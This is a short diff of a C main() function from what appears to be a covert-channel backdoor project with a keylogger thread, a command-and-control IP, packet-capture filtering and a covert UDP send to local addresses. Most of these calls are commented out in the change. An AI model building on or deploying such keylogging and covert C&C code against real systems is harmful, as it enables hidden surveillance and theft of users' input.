@@ -77,19 +77,22 @@ int main(int argc, char **argv){
 
     //TESTING
     //pthread_join(keylogger_thread, NULL);
-
+/*
     printf("%s\n",cnc_ip);
     Filter = InitFilter(cnc_ip,local_ip, true);
     PrintFilter(Filter);
     CreateFilter(Filter, pcapfilter);
     printf("Filter: %s\n",pcapfilter);
+*/
+
+
     /*
     char *buf;
     buf="ben";
     covert_udp_send("192.168.0.118", "192.168.0.115", 8506, 8506, buf, 2);
     covert_udp_send("192.168.0.118", "192.168.0.115", 8507, 8507, buf, 2);*/
-    Packetcapture(pcapfilter,Filter,true);
+ //   Packetcapture(pcapfilter,Filter,true);
 
-    pthread_cancel(keylogger_thread);
+ //   pthread_cancel(keylogger_thread);
     return 0;
 }
